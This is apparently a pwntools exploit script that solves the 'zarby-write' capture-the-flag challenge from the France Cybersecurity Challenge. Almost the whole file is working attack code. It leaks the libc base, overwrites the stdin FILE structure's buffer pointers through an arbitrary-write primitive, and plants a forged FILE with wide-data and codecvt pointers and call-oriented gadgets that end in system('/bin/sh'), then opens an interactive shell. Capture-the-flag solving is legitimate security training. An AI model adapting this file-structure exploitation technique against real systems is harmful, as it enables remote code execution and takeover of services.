from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./zarby-write_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define stdin
    p _IO_2_1_stdin_
    end
    define stdin2
    x/80xg &_IO_2_1_stdin_
    end
    define setupbreak
    d
    b *__libio_codecvt_in+82
    b *__libio_codecvt_in+132
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2102)

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty) # stdin=pty to avoid pwntools messing with the file structures and the heap
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

# exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    def write(address, value):
        sl(str(address).encode() + b" " + str(value).encode())
        sleep(speed)

    libc.address = int(getb(recv(), b"libc: ", b"\n"), 16) - 0x4ebf0
    print("libc: %#018x" % libc.address)

    file_addr = libc.sym["_IO_2_1_stdin_"]

    buf_base = file_addr + 0x38
    buf_end = file_addr + 0x40

    write(buf_base, file_addr - 0x20)
    write(buf_end, file_addr + 0x200)

    input("shell")

    print(hex(libc.sym["_IO_stdfile_0_lock"]))

    cop_gadget_1 = libc.address + 0x15e589
    cop_gadget_2 = libc.address + 0x15b8b2

    wide_addr = file_addr + 0xe0
    cop1_addr = wide_addr + 0x18

    fake_file = FileStructure()
    fake_file.flags = 0xfbad208b
    fake_file._IO_read_ptr = file_addr + 131
    fake_file._IO_buf_end = 0xdeadbeefcafebabe
    fake_file._lock = libc.sym["_IO_stdfile_0_lock"]
    fake_file._codecvt = file_addr + 0xb8
    fake_file._wide_data = file_addr + 0x200
    fake_file.unknown2 = flat([ # hey at least it works
        0,
        0,
        file_addr + 0xd0,
        0,
        0,
        0,
        libc.sym['_IO_wfile_jumps'],
        0,
        0,
        0,
        cop_gadget_1,
        cop1_addr + 0x20,
        cop1_addr + 8,
        cop_gadget_2,

        b"/bin/sh\0",
        0,
        0,
        libc.sym["system"],
        0,
        0,
        0,
        cop1_addr + 0x28,
    ])
    sl(b"A"*0x20 + bytes(fake_file))

    sleep(speed)

    sl(b"0 0")

    io.interactive()
    input("end")
    exit()

launch()
exploit()
